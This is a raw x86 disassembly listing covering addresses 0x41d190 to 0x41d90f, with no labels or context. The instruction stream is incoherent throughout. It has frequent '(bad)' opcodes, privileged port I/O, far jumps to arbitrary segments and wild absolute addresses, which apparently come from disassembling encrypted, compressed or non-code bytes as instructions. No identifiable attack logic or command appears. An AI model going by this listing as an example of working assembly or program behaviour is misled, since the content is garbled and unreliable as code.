  41d190:	in     al,0xee
  41d192:	and    BYTE PTR [edx+0x2a6cd838],al
  41d198:	jle    0x41d1b5
  41d19a:	aaa    
  41d19b:	sti    
  41d19c:	shl    DWORD PTR [edx],0xb5
  41d19f:	add    BYTE PTR [ebx+edi*1+0x2c9827b6],al
  41d1a6:	adc    ebp,DWORD PTR [edx+0x7b88221f]
  41d1ac:	stc    
  41d1ad:	and    BYTE PTR [eax],dh
  41d1af:	dec    ebx
  41d1b0:	fild   DWORD PTR [ecx+0x77]
  41d1b3:	(bad)  
  41d1b4:	cmc    
  41d1b5:	sti    
  41d1b6:	xchg   ebp,eax
  41d1b7:	(bad)  
  41d1b8:	sub    edi,esi
  41d1ba:	arpl   WORD PTR [ecx-0x75],dx
  41d1bd:	rol    BYTE PTR [ebp+0x7e19e0bb],0x12
  41d1c4:	call   0x7e90721a
  41d1c9:	pop    ss
  41d1ca:	mov    BYTE PTR [edi],al
  41d1cc:	mov    esi,0x749aeacf
  41d1d1:	clc    
  41d1d2:	jmp    0x55b9:0x16547d22
  41d1d9:	push   es
  41d1da:	sbb    al,0x98
  41d1dc:	std    
  41d1dd:	test   eax,0x45d11e64
  41d1e3:	lods   eax,DWORD PTR ds:[esi]
  41d1e4:	test   eax,0xdccd7832
  41d1e9:	out    dx,eax
  41d1ea:	loope  0x41d178
  41d1ec:	push   ebx
  41d1ed:	xor    esi,DWORD PTR [ebx-0x1a675646]
  41d1f3:	mov    ds:0xddf07b01,eax
  41d1f8:	sub    ecx,eax
  41d1fa:	test   BYTE PTR [ebx-0x2728f6a4],0x34
  41d201:	xchg   BYTE PTR [esi+ecx*2],al
  41d204:	inc    BYTE PTR [eax+0x38e180d9]
  41d20a:	xchg   ebp,eax
  41d20b:	xchg   DWORD PTR [ecx-0x57],edx
  41d20e:	jecxz  0x41d1ee
  41d210:	xchg   esi,eax
  41d211:	dec    bx
  41d213:	adc    eax,DWORD PTR [ebp+0x27]
  41d216:	imul   ecx,DWORD PTR [ecx],0xf8b1b7ab
  41d21c:	fs in  eax,dx
  41d21e:	push   0xac4bc444
  41d223:	adc    al,0xf0
  41d225:	pop    edi
  41d226:	cmp    ebp,DWORD PTR [ecx+0x187ae6cf]
  41d22c:	std    
  41d22d:	sub    ch,BYTE PTR [edi+0x23]
  41d230:	je     0x41d1d5
  41d232:	adc    edi,DWORD PTR [edi+0x7f4c7965]
  41d238:	out    0xcf,al
  41d23a:	mov    edi,0xe51d3514
  41d23f:	inc    eax
  41d240:	xchg   ecx,eax
  41d241:	cmp    esi,ebp
  41d243:	xchg   edi,eax
  41d244:	lock shl BYTE PTR [esi+0x7eb67662],cl
  41d24b:	lea    ebp,[edi]
  41d24d:	dec    edx
  41d24e:	sbb    esp,DWORD PTR ds:0xa7e05a57
  41d254:	sbb    edx,esp
  41d256:	cld    
  41d257:	mov    al,BYTE PTR [eax-0x4a]
  41d25a:	add    DWORD PTR [ebx-0x2948d853],eax
  41d260:	fild   DWORD PTR [esi+ebp*8+0x39dbc8bf]
  41d267:	dec    eax
  41d268:	shl    BYTE PTR [eax+0x441ec9aa],0x91
  41d26f:	(bad)  
  41d271:	inc    esp
  41d272:	and    ebx,DWORD PTR [ebx+0x6d]
  41d275:	mov    ebx,0x812742e7
  41d27a:	mov    eax,ds:0xf441381c
  41d27f:	into   
  41d280:	fst    DWORD PTR [eax+ebx*4]
  41d283:	xchg   edi,eax
  41d284:	cli    
  41d285:	cmp    BYTE PTR [esi+edi*1],ah
  41d288:	xchg   edx,eax
  41d289:	call   0xd9e3:0x8c641753
  41d290:	and    esi,0x20
  41d293:	shl    bh,cl
  41d295:	pop    ds
  41d296:	int    0x6b
  41d298:	shl    DWORD PTR [ecx-0x32],cl
  41d29b:	xchg   BYTE PTR [eax],ch
  41d29d:	mov    BYTE PTR [ebp-0x1],cl
  41d2a0:	or     eax,0xb4bb8d05
  41d2a5:	in     al,0xeb
  41d2a7:	cmc    
  41d2a8:	(bad)  
  41d2a9:	(bad)  
  41d2ab:	cwde   
  41d2ac:	dec    ebp
  41d2ad:	cdq    
  41d2ae:	pop    ecx
  41d2af:	aam    0x2d
  41d2b1:	cmp    ebx,DWORD PTR ss:[eax]
  41d2b4:	js     0x41d292
  41d2b6:	leave  
  41d2b7:	adc    ch,BYTE PTR [ebx-0x10]
  41d2ba:	lods   eax,DWORD PTR ds:[esi]
  41d2bc:	jp     0x41d309
  41d2be:	pusha  
  41d2bf:	push   ss
  41d2c0:	jmp    0x38da:0x843bb6e8
  41d2c7:	xchg   esp,eax
  41d2c8:	loopne 0x41d304
  41d2ca:	neg    DWORD PTR [esi+0x27]
  41d2cd:	pop    ds
  41d2ce:	or     al,0x69
  41d2d0:	inc    edx
  41d2d1:	dec    ecx
  41d2d2:	out    dx,al
  41d2d3:	fwait
  41d2d4:	aad    0x1c
  41d2d6:	mov    ebp,0xe80e6cbb
  41d2db:	nop
  41d2dc:	sbb    DWORD PTR [edx+0x6ca472eb],0x7
  41d2e3:	pop    ebx
  41d2e4:	and    eax,0x6e2448a0
  41d2e9:	xor    al,0xef
  41d2ec:	test   al,0x65
  41d2ee:	mov    ebx,0x22d2ab7c
  41d2f3:	jg     0x41d373
  41d2f5:	nop
  41d2f6:	sahf   
  41d2f7:	push   es
  41d2f8:	leave  
  41d2f9:	xor    al,0xba
  41d2fc:	cmp    ebp,DWORD PTR [bp+si+0x18ab]
  41d301:	jae    0x41d30b
  41d303:	sbb    al,0x71
  41d305:	pop    ds
  41d306:	cmp    bl,BYTE PTR ds:0x8f3be381
  41d30c:	in     eax,dx
  41d30d:	rol    BYTE PTR [ebx-0x1f14c665],cl
  41d313:	sub    eax,0x55f9346e
  41d318:	fnstsw WORD PTR [edi]
  41d31a:	push   cs
  41d31b:	scas   eax,DWORD PTR es:[edi]
  41d31c:	(bad)  
  41d31d:	(bad)  
  41d31e:	lods   al,BYTE PTR ds:[esi]
  41d31f:	push   ebp
  41d320:	mov    cl,0x26
  41d322:	popa   
  41d323:	xchg   edx,eax
  41d324:	ins    DWORD PTR es:[edi],dx
  41d325:	lods   eax,DWORD PTR ds:[esi]
  41d326:	sbb    DWORD PTR ds:0x830ae0fe,esi
  41d32c:	loopne 0x41d39c
  41d32e:	add    eax,0x8a4d06ae
  41d333:	mov    edx,0xe137f3ba
  41d338:	stos   BYTE PTR es:[edi],al
  41d339:	imul   edi,DWORD PTR [edi+0x34835558],0x4a31f9ab
  41d343:	add    al,0xe3
  41d345:	out    dx,al
  41d346:	jns    0x41d377
  41d348:	rol    DWORD PTR [ecx+0x23c8aea],cl
  41d34e:	push   es
  41d34f:	in     eax,0x1
  41d351:	or     edi,esp
  41d353:	popf   
  41d354:	hlt    
  41d355:	cmp    eax,0xe272d4ab
  41d35a:	inc    eax
  41d35b:	outs   dx,BYTE PTR ds:[esi]
  41d35c:	xchg   esp,eax
  41d35d:	cmp    DWORD PTR [ecx+0x50],edx
  41d360:	jle    0x41d32b
  41d362:	mov    esp,0x7b87307e
  41d367:	ud1    edi,esi
  41d36a:	xchg   edi,eax
  41d36b:	xor    eax,edx
  41d36d:	js     0x41d3a9
  41d36f:	stos   BYTE PTR es:[edi],al
  41d370:	daa    
  41d371:	xchg   cx,ax
  41d373:	popf   
  41d374:	dec    edx
  41d375:	and    al,0x12
  41d377:	xchg   DWORD PTR [eax],ebx
  41d379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d37a:	ss jne 0x41d3b5
  41d37d:	pushf  
  41d37e:	jl     0x41d35a
  41d380:	sub    al,0x7a
  41d382:	jl     0x41d386
  41d384:	jmp    0xc3353fa2
  41d389:	in     eax,0xf2
  41d38b:	(bad)  
  41d38d:	inc    ecx
  41d38e:	xchg   esi,eax
  41d38f:	mov    ebp,DWORD PTR [esi-0x4c0c68b6]
  41d395:	es js  0x41d408
  41d398:	(bad)  
  41d39a:	or     eax,esp
  41d39c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d39d:	cvttps2pi mm5,QWORD PTR [edx+0x48]
  41d3a1:	outs   dx,DWORD PTR ds:[esi]
  41d3a2:	mov    bh,0x23
  41d3a4:	or     BYTE PTR [ebx+0x4b],cl
  41d3a7:	cli    
  41d3a8:	pop    ebp
  41d3a9:	jbe    0x41d346
  41d3ab:	pop    ebx
  41d3ac:	mov    bl,0xd7
  41d3ae:	pop    esi
  41d3af:	imul   ecx,DWORD PTR [ebx],0xffffffbd
  41d3b2:	jmp    0xfecd:0xf1ed41a8
  41d3b9:	add    al,0x45
  41d3bb:	mov    cl,0x74
  41d3bd:	mov    ch,0xa6
  41d3bf:	cwde   
  41d3c0:	sub    al,0x8
  41d3c2:	fbld   TBYTE PTR [eax-0x5f]
  41d3c5:	hlt    
  41d3c6:	jmp    0x41d3e2
  41d3c8:	inc    ebp
  41d3c9:	aas    
  41d3ca:	ret    
  41d3cb:	inc    ebx
  41d3cc:	sub    ebp,DWORD PTR [ecx+0x29]
  41d3cf:	shl    DWORD PTR [edx-0x40a1e5a7],cl
  41d3d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3d6:	fstp   DWORD PTR [ebx]
  41d3d8:	sbb    DWORD PTR [esi+edi*8-0x6],ebx
  41d3dc:	xor    eax,DWORD PTR [esi+0x7a802223]
  41d3e2:	add    BYTE PTR [edi-0x5f],0x6a
  41d3e6:	loope  0x41d434
  41d3e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3e9:	(bad)  
  41d3ea:	mov    ah,0x80
  41d3ec:	stc    
  41d3ed:	popa   
  41d3ee:	in     eax,0x62
  41d3f0:	popf   
  41d3f1:	(bad)  
  41d3f3:	loope  0x41d3a8
  41d3f5:	jb     0x41d386
  41d3f7:	popa   
  41d3f8:	ror    edi,0xb0
  41d3fb:	push   es
  41d3fc:	cmp    BYTE PTR ds:0x918d39d0,cl
  41d402:	aas    
  41d403:	loopne 0x41d451
  41d405:	xor    al,bh
  41d407:	iret   
  41d408:	dec    esi
  41d409:	pop    ebp
  41d40a:	pusha  
  41d40b:	dec    ecx
  41d40c:	call   0x187aca87
  41d411:	mov    dh,0xf3
  41d413:	mov    esp,0x151823f6
  41d418:	cmp    al,0x36
  41d41a:	stc    
  41d41b:	jbe    0x41d43e
  41d41d:	jnp    0x41d476
  41d41f:	popf   
  41d420:	clc    
  41d421:	jnp    0x41d45d
  41d423:	pop    ebp
  41d424:	imul   eax,DWORD PTR [esi+eax*1-0x3],0xec26ca0d
  41d42c:	test   DWORD PTR [ecx-0x719a1494],0xd7718471
  41d436:	pop    es
  41d437:	cld    
  41d438:	xchg   DWORD PTR [ebx-0x4f89be5e],ecx
  41d43e:	ds (bad) 
  41d440:	adc    edx,DWORD PTR [esi]
  41d442:	xchg   DWORD PTR [ecx],esi
  41d444:	sbb    eax,0xc00963d0
  41d449:	loopne 0x41d3e8
  41d44b:	outs   dx,DWORD PTR ds:[esi]
  41d44c:	shl    BYTE PTR [edx+0x7aec221],1
  41d452:	in     al,dx
  41d453:	inc    edx
  41d454:	std    
  41d455:	pop    es
  41d456:	push   esi
  41d457:	mov    bh,0xe9
  41d459:	xlat   BYTE PTR ds:[ebx]
  41d45a:	(bad)  
  41d45b:	nop
  41d45c:	fdivr  DWORD PTR [eax+0x46]
  41d45f:	adc    al,0x3b
  41d461:	ds jp  0x41d4d3
  41d464:	mov    ebx,DWORD PTR [eax-0x2f53e1d9]
  41d46a:	dec    eax
  41d46b:	imul   edx,DWORD PTR [edx-0x827cf78],0x3b0aa373
  41d475:	push   ebx
  41d476:	push   ebx
  41d477:	inc    cx
  41d479:	test   BYTE PTR ds:0xf996e2a8,0xb3
  41d480:	out    0x21,eax
  41d482:	(bad)  
  41d483:	call   0xd1a64abe
  41d488:	mov    ds:0x628fadfd,al
  41d48d:	mov    ch,0x90
  41d490:	call   0x3051:0x45b32222
  41d497:	aas    
  41d498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d499:	stos   DWORD PTR es:[edi],eax
  41d49a:	ins    BYTE PTR es:[edi],dx
  41d49b:	cli    
  41d49c:	push   eax
  41d49d:	cmp    eax,0xa20690da
  41d4a2:	push   ebp
  41d4a3:	lds    ecx,FWORD PTR [eax+0x3d8c33d2]
  41d4a9:	adc    ebp,esp
  41d4ab:	(bad)  [ecx-0x16]
  41d4ae:	push   edi
  41d4af:	(bad)  
  41d4b0:	inc    edi
  41d4b1:	out    0xbc,al
  41d4b3:	xchg   edi,eax
  41d4b4:	mov    bh,0xf1
  41d4b6:	jo     0x41d510
  41d4b8:	sub    DWORD PTR [esi+0x631d4260],esi
  41d4be:	shl    DWORD PTR [edi+0x9574bfc],1
  41d4c4:	ins    BYTE PTR es:[edi],dx
  41d4c5:	or     DWORD PTR [edx-0x675d9b9c],edi
  41d4cb:	dec    edx
  41d4cc:	mov    ebp,0x7c40dc33
  41d4d1:	pop    ebx
  41d4d2:	shr    BYTE PTR [eax-0x4802a04],0x1c
  41d4d9:	sub    esi,DWORD PTR [esi+0x61]
  41d4dc:	loope  0x41d461
  41d4de:	in     al,dx
  41d4df:	stos   BYTE PTR es:[edi],al
  41d4e0:	xor    al,0x68
  41d4e2:	imul   ebx
  41d4e4:	adc    BYTE PTR [edi-0x588cba1d],bh
  41d4ea:	sbb    cl,bl
  41d4ec:	test   eax,0x28a65e00
  41d4f1:	xor    al,0xcf
  41d4f3:	push   es
  41d4f4:	outs   dx,DWORD PTR ds:[esi]
  41d4f5:	xchg   BYTE PTR [edi],al
  41d4f7:	xor    eax,0x2c9199b8
  41d4fc:	push   ebx
  41d4fd:	jbe    0x41d52f
  41d4ff:	adc    dh,dh
  41d501:	stos   DWORD PTR es:[edi],eax
  41d502:	mov    dl,BYTE PTR [ebx-0x27]
  41d505:	adc    BYTE PTR es:0xb033d820,bl
  41d50c:	(bad)  
  41d50d:	mov    ebx,0xb12b89dd
  41d512:	retf   0x4e25
  41d515:	fucomi st,st(0)
  41d517:	adc    eax,0xa587ede0
  41d51c:	bound  ecx,QWORD PTR [eax]
  41d51e:	lds    ecx,FWORD PTR [ebx+0x34c379a0]
  41d524:	fsubr  st(3),st
  41d526:	inc    ecx
  41d527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d528:	sbb    ecx,ebp
  41d52a:	fnstsw WORD PTR [edx-0x3e]
  41d52d:	push   ebx
  41d52e:	mov    esp,0xb9d0d8c
  41d533:	idiv   BYTE PTR [edi]
  41d535:	jge    0x41d596
  41d537:	into   
  41d538:	push   esi
  41d539:	sar    edi,cl
  41d53b:	adc    DWORD PTR [ebx],edx
  41d53d:	jne    0x41d521
  41d53f:	sar    DWORD PTR [edi],cl
  41d541:	cmp    eax,0x2ef903fe
  41d546:	jg     0x41d51a
  41d548:	stos   BYTE PTR es:[edi],al
  41d549:	adc    DWORD PTR [ebx-0x5],ebx
  41d54c:	les    esp,FWORD PTR [eax]
  41d54e:	dec    ecx
  41d54f:	cmc    
  41d550:	sub    eax,DWORD PTR [eax+0x2962df4e]
  41d556:	sbb    DWORD PTR [ecx+0x7a],ebx
  41d559:	dec    esp
  41d55a:	dec    ebp
  41d55b:	add    cl,BYTE PTR [ebp+ebp*1-0x679b0059]
  41d562:	pop    edx
  41d563:	mov    esp,0xaf620626
  41d568:	lea    ecx,[ecx-0x799439ba]
  41d56e:	xchg   edi,eax
  41d56f:	hlt    
  41d570:	mov    ah,0x53
  41d572:	in     eax,dx
  41d573:	or     eax,0x357bcf55
  41d578:	hlt    
  41d579:	fstp   QWORD PTR [eax]
  41d57b:	(bad)  
  41d57c:	jge    0x41d53a
  41d57e:	mov    ch,0x28
  41d580:	inc    ebp
  41d581:	sub    eax,0x69ec0268
  41d586:	sar    BYTE PTR [ecx-0x2d588e3c],1
  41d58c:	cs out dx,al
  41d58e:	pop    ebp
  41d58f:	jmp    0x312bfd4d
  41d594:	mov    ecx,0x9184ef85
  41d599:	fsubr  QWORD PTR [ebx+ebp*8-0x306425fe]
  41d5a0:	sub    ebx,DWORD PTR ss:[ecx-0x53]
  41d5a4:	gs (bad) 
  41d5a6:	mov    edi,0x86226dc3
  41d5ab:	mov    ebp,0xd7986b3b
  41d5b0:	push   0x24e57001
  41d5b5:	jo     0x41d545
  41d5b7:	xchg   esi,eax
  41d5b8:	xor    eax,0xa01ce081
  41d5bd:	mov    edx,edx
  41d5bf:	xor    DWORD PTR [eax+0x28],esi
  41d5c2:	je     0x41d5e4
  41d5c4:	jae    0x41d55e
  41d5c6:	daa    
  41d5c7:	mov    ds:0x4f174791,al
  41d5cc:	mov    ds:0x4378f8cd,al
  41d5d1:	mov    gs,WORD PTR [eax+edx*2-0x30fb77c4]
  41d5d8:	push   edx
  41d5d9:	loop   0x41d5d1
  41d5db:	jnp    0x41d64d
  41d5dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5de:	leave  
  41d5df:	or     al,0xa3
  41d5e1:	dec    esp
  41d5e2:	ror    DWORD PTR [ebp+0x7e50bb2e],1
  41d5e8:	and    eax,0xaa09c18c
  41d5ed:	sub    eax,0x99091750
  41d5f2:	mov    edx,0xb4dbd27
  41d5f7:	push   ds
  41d5f8:	retf   
  41d5f9:	rcl    BYTE PTR [esi],0x9d
  41d5fc:	ins    BYTE PTR es:[edi],dx
  41d5fd:	(bad)  
  41d5ff:	fcomp  QWORD PTR [esi+0x5b]
  41d602:	loope  0x41d5c4
  41d604:	sbb    BYTE PTR [edx+ebp*8],bh
  41d607:	pop    edx
  41d608:	dec    eax
  41d609:	or     al,0xf9
  41d60b:	mov    ebp,0x729952b7
  41d610:	stos   BYTE PTR es:[edi],al
  41d611:	push   ebp
  41d612:	loop   0x41d678
  41d614:	jae    0x41d67a
  41d616:	adc    dl,bh
  41d618:	div    esp
  41d61a:	fld    DWORD PTR [ecx+0x38]
  41d61d:	fsub   DWORD PTR [esi+edx*1]
  41d620:	in     al,0x88
  41d622:	push   0x625c66e4
  41d627:	push   0x53
  41d629:	inc    ebx
  41d62a:	lahf   
  41d62b:	gs inc ebx
  41d62d:	outs   dx,DWORD PTR ds:[esi]
  41d62e:	in     al,0x10
  41d630:	mov    ebx,DWORD PTR [eax]
  41d632:	xor    al,0xf8
  41d634:	jbe    0x41d5ec
  41d636:	and    eax,0xcb7ccc9c
  41d63b:	cmp    ebx,DWORD PTR [ebp+0x8c99528]
  41d641:	test   al,0xa2
  41d643:	push   ebp
  41d644:	jp     0x41d66c
  41d646:	mov    ds:0xdab77fbf,eax
  41d64b:	jl     0x41d69d
  41d64d:	(bad)  
  41d64e:	xchg   edi,eax
  41d64f:	xchg   DWORD PTR [edi-0x4e8d9dcc],edx
  41d655:	icebp  
  41d656:	xchg   BYTE PTR [esi],ah
  41d658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d659:	adc    DWORD PTR [eax+0x5f210358],0x64
  41d660:	or     eax,0xbf7e843f
  41d665:	inc    ecx
  41d666:	outs   dx,BYTE PTR ds:[esi]
  41d667:	inc    ebx
  41d668:	int3   
  41d669:	fs sti 
  41d66b:	cmc    
  41d66c:	fdivr  QWORD PTR [esp+edi*8]
  41d66f:	xchg   edx,eax
  41d670:	xchg   DWORD PTR [eax-0x5823a976],eax
  41d676:	push   0x8d692020
  41d67b:	sar    BYTE PTR [esi],cl
  41d67d:	ins    BYTE PTR es:[edi],dx
  41d67e:	(bad)  
  41d67f:	and    DWORD PTR [edx+0x18],eax
  41d682:	arpl   di,si
  41d684:	xchg   BYTE PTR [eax],al
  41d686:	mov    ebx,edx
  41d688:	loop   0x41d668
  41d68a:	pop    ebx
  41d68b:	cwde   
  41d68c:	into   
  41d68d:	pusha  
  41d68e:	icebp  
  41d68f:	test   BYTE PTR [edx-0xa617854],al
  41d695:	rcl    DWORD PTR [eax],1
  41d697:	not    BYTE PTR [ebp+ebx*8-0x1]
  41d69b:	jb     0x41d700
  41d69d:	repnz cmp BYTE PTR [edi+edi*1],0xb
  41d6a2:	(bad)  
  41d6a3:	sar    BYTE PTR [edx],cl
  41d6a5:	int3   
  41d6a6:	adc    edx,DWORD PTR [eax+0x72a9ef5d]
  41d6ac:	sub    dh,BYTE PTR ds:0x8bdee9c
  41d6b2:	ja     0x41d6b0
  41d6b4:	leave  
  41d6b5:	push   ebp
  41d6b6:	fisubr DWORD PTR [ebp+0x4c5f3f54]
  41d6bc:	cmp    al,0xa3
  41d6be:	dec    ebx
  41d6bf:	push   edi
  41d6c0:	mov    ss,edi
  41d6c2:	xchg   BYTE PTR [ebp+0x76e5c0b5],cl
  41d6c8:	jmp    0x493b:0x332de9a
  41d6cf:	dec    edx
  41d6d0:	div    esi
  41d6d2:	test   eax,0xe0d03d6d
  41d6d7:	jne    0x41d66c
  41d6d9:	push   ecx
  41d6da:	loope  0x41d6c4
  41d6dc:	pop    ds
  41d6dd:	xchg   edx,eax
  41d6de:	pop    ds
  41d6df:	pop    ss
  41d6e0:	not    DWORD PTR [esi+0x7]
  41d6e3:	sub    ch,0xab
  41d6e6:	mov    cl,0x80
  41d6e8:	movaps xmm6,xmm4
  41d6eb:	pushf  
  41d6ec:	dec    esp
  41d6ed:	popa   
  41d6ee:	cs dec ebp
  41d6f0:	sbb    esp,DWORD PTR [eax]
  41d6f2:	daa    
  41d6f3:	or     esp,esi
  41d6f5:	jp     0x41d67d
  41d6f7:	sub    eax,0xdd431702
  41d6fc:	mov    WORD PTR [edi+0x5c],cs
  41d6ff:	stos   DWORD PTR es:[edi],eax
  41d700:	mov    dh,0x23
  41d702:	retf   
  41d703:	std    
  41d704:	and    edi,eax
  41d706:	out    0xf1,eax
  41d708:	or     eax,0x78646b97
  41d70d:	scas   eax,DWORD PTR es:[edi]
  41d70e:	cdq    
  41d70f:	fucomip st,st(7)
  41d711:	and    al,0xf2
  41d713:	jecxz  0x41d6cd
  41d715:	mov    edx,0x3d6bca50
  41d71a:	out    dx,al
  41d71b:	dec    esp
  41d71c:	pop    ecx
  41d71d:	jl     0x41d70d
  41d71f:	dec    ebx
  41d720:	mov    eax,ds:0x910f2288
  41d725:	loope  0x41d708
  41d727:	dec    eax
  41d728:	aaa    
  41d729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d72a:	into   
  41d72b:	adc    ebx,eax
  41d72d:	(bad)  
  41d72f:	add    al,0x30
  41d731:	sbb    DWORD PTR [edi+ecx*1+0x4],0x54
  41d736:	xor    al,0x7a
  41d738:	into   
  41d739:	je     0x41d703
  41d73b:	adc    dl,BYTE PTR [esi+esi*1+0x6770d1ae]
  41d742:	icebp  
  41d743:	jne    0x41d715
  41d745:	lds    edi,FWORD PTR [ebx]
  41d747:	aaa    
  41d748:	fwait
  41d749:	sub    BYTE PTR [ecx],ch
  41d74b:	mov    ch,0x52
  41d74d:	in     al,0xf3
  41d74f:	cs pop esp
  41d751:	sub    bh,BYTE PTR [esi]
  41d753:	sbb    eax,0xd7fd56a9
  41d758:	xchg   esp,eax
  41d759:	xor    ebp,edi
  41d75b:	pop    edx
  41d75c:	mov    ds:0xb91a2da4,eax
  41d761:	mov    bl,0x9c
  41d763:	adc    eax,0xc8c0ae5b
  41d768:	mov    ecx,0x33a8742
  41d76d:	mov    esp,0x3d9e364f
  41d772:	and    al,0xef
  41d774:	daa    
  41d775:	sub    BYTE PTR [ebx-0x19],al
  41d778:	mov    ds:0x70d4a54b,eax
  41d77d:	enter  0xb559,0x36
  41d781:	dec    esi
  41d782:	fcmovnb st,st(6)
  41d784:	fld    DWORD PTR [edx-0x2f]
  41d787:	(bad)  
  41d789:	imul   BYTE PTR [ebx+edx*8-0x1a589281]
  41d790:	dec    ecx
  41d791:	daa    
  41d792:	iret   
  41d793:	rcr    BYTE PTR [edx+0x57],cl
  41d796:	out    dx,eax
  41d797:	icebp  
  41d798:	adc    DWORD PTR [eax-0x314b653f],edx
  41d79e:	push   esi
  41d79f:	mov    dl,0x99
  41d7a1:	hlt    
  41d7a2:	mov    ah,0x4d
  41d7a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7a5:	hlt    
  41d7a6:	or     ah,BYTE PTR [edi+0x3d]
  41d7a9:	mov    BYTE PTR [ecx],ch
  41d7ab:	sub    eax,0xfb0e2de3
  41d7b0:	scas   al,BYTE PTR es:[edi]
  41d7b1:	mov    bl,BYTE PTR [esi+0x64]
  41d7b4:	fistp  DWORD PTR [eax+0x3e7f3d7c]
  41d7ba:	mov    eax,0xb61b8d53
  41d7bf:	adc    al,0xc
  41d7c1:	retf   0xe903
  41d7c4:	cmc    
  41d7c5:	fidivr DWORD PTR [edi+esi*1+0x8]
  41d7c9:	jp     0x41d7c1
  41d7cb:	jmp    0x41d7a4
  41d7cd:	sti    
  41d7ce:	dec    edi
  41d7cf:	adc    BYTE PTR [edi],ch
  41d7d1:	dec    edx
  41d7d2:	jecxz  0x41d76d
  41d7d4:	add    bh,BYTE PTR [esp+ebp*2]
  41d7d7:	aam    0x6c
  41d7d9:	adc    eax,0xd591494
  41d7de:	sub    ah,BYTE PTR [esp+esi*1-0x7b]
  41d7e2:	pusha  
  41d7e3:	mov    bl,0xcb
  41d7e5:	xor    al,0x78
  41d7e7:	cmp    eax,0x1751eb4a
  41d7ec:	stos   BYTE PTR es:[edi],al
  41d7ed:	inc    DWORD PTR [edx-0x20]
  41d7f0:	addr16 or al,0xd2
  41d7f3:	gs in  al,dx
  41d7f5:	mov    edx,0x3d82f97c
  41d7fa:	mov    ebx,DWORD PTR [edi-0x62]
  41d7fd:	xchg   DWORD PTR [edx],ecx
  41d7ff:	loopne 0x41d7f2
  41d801:	push   esp
  41d802:	call   0xaf57685e
  41d807:	dec    edi
  41d808:	inc    ebp
  41d809:	gs sar ch,1
  41d80c:	jmp    0xcca7aa94
  41d811:	rep outs dx,BYTE PTR ds:[esi]
  41d813:	cmp    BYTE PTR [ebp+0x3b4edea7],0xbc
  41d81a:	jns    0x41d7cd
  41d81c:	push   ebp
  41d81d:	inc    eax
  41d81e:	and    ah,0xa3
  41d821:	push   ss
  41d822:	arpl   WORD PTR [edx+esi*4],cx
  41d825:	pop    esi
  41d826:	loope  0x41d7d1
  41d828:	adc    ah,BYTE PTR [eax+0x62b3da6e]
  41d82e:	stos   BYTE PTR es:[edi],al
  41d82f:	dec    ebx
  41d830:	jbe    0x41d7cf
  41d832:	outs   dx,DWORD PTR ds:[esi]
  41d833:	inc    ecx
  41d834:	test   al,0x68
  41d836:	sbb    edx,ebx
  41d838:	ror    DWORD PTR [edi-0x4b015a9d],0x71
  41d83f:	shl    DWORD PTR [edi],0xb6
  41d842:	test   al,0x1f
  41d844:	rcl    BYTE PTR ds:0xf2e6428c,1
  41d84a:	jns    0x41d87d
  41d84c:	inc    edx
  41d84d:	inc    eax
  41d84e:	push   ebx
  41d84f:	(bad)  
  41d851:	inc    esi
  41d852:	xchg   edx,eax
  41d853:	repz (bad) 
  41d855:	adc    eax,0x7eed40c7
  41d85a:	cmp    DWORD PTR [ecx],ecx
  41d85c:	inc    edi
  41d85d:	mov    ah,0xf
  41d85f:	inc    ebx
  41d860:	sub    eax,0x5778bcb6
  41d865:	add    eax,0xb7126733
  41d86a:	xchg   ebp,eax
  41d86b:	es pop esp
  41d86d:	and    al,0x3f
  41d86f:	push   ss
  41d870:	mov    BYTE PTR [esi],bh
  41d872:	dec    esi
  41d873:	adc    al,BYTE PTR [ebx+0x669876cb]
  41d879:	inc    eax
  41d87a:	mov    ecx,0xa4f9251a
  41d87f:	jp     0x41d8b3
  41d881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d882:	or     al,0x4f
  41d884:	es pop edx
  41d886:	jbe    0x41d8f6
  41d888:	fwait
  41d889:	jecxz  0x41d87b
  41d88b:	scas   eax,DWORD PTR es:[edi]
  41d88c:	int    0x65
  41d88e:	fsub   QWORD PTR [eax+edi*4]
  41d891:	fwait
  41d892:	retf   0x3dc9
  41d895:	lock add esi,DWORD PTR [edi+esi*4-0x7ff7bd9f]
  41d89d:	or     dl,bh
  41d89f:	(bad)  [ebx-0x3592ca61]
  41d8a5:	das    
  41d8a6:	cli    
  41d8a7:	push   eax
  41d8a8:	jmp    0x99e9b3ac
  41d8ad:	xor    BYTE PTR [ecx-0x5c67bed4],al
  41d8b3:	and    DWORD PTR [esi+0x3e8d793d],ecx
  41d8b9:	in     eax,dx
  41d8ba:	sar    BYTE PTR [ecx],0xb8
  41d8bd:	push   cs
  41d8be:	pop    ebp
  41d8bf:	xchg   edx,eax
  41d8c0:	scas   al,BYTE PTR es:[edi]
  41d8c1:	je     0x41d85a
  41d8c3:	std    
  41d8c4:	stos   DWORD PTR es:[edi],eax
  41d8c5:	xor    DWORD PTR [ebx-0x565b5239],edx
  41d8cb:	pop    ecx
  41d8cc:	mov    bh,0xbc
  41d8ce:	fimul  DWORD PTR [edi-0x670ba362]
  41d8d4:	or     ebp,DWORD PTR [edx-0x4e]
  41d8d7:	into   
  41d8d8:	jmp    0x2b6a:0x9decff81
  41d8df:	xor    eax,0xb146d3e6
  41d8e4:	shl    DWORD PTR [esi],1
  41d8e6:	bswap  ecx
  41d8e8:	xor    ebp,DWORD PTR [edx+ecx*8+0x19]
  41d8ec:	sbb    bl,cl
  41d8ee:	mov    ds,WORD PTR [ebp-0x6605e774]
  41d8f4:	mov    al,0xb0
  41d8f6:	arpl   WORD PTR [ecx+0x25e23c3d],bx
  41d8fc:	cmc    
  41d8fd:	mov    esp,0x3200ee29
  41d902:	scas   al,BYTE PTR es:[edi]
  41d903:	pop    ebp
  41d904:	xor    edx,esi
  41d906:	popf   
  41d907:	xor    eax,0x61f596b3
  41d90c:	inc    ebp
  41d90d:	adc    al,ch
  41d90f:	ins    DWORD PTR es:[edi],dx
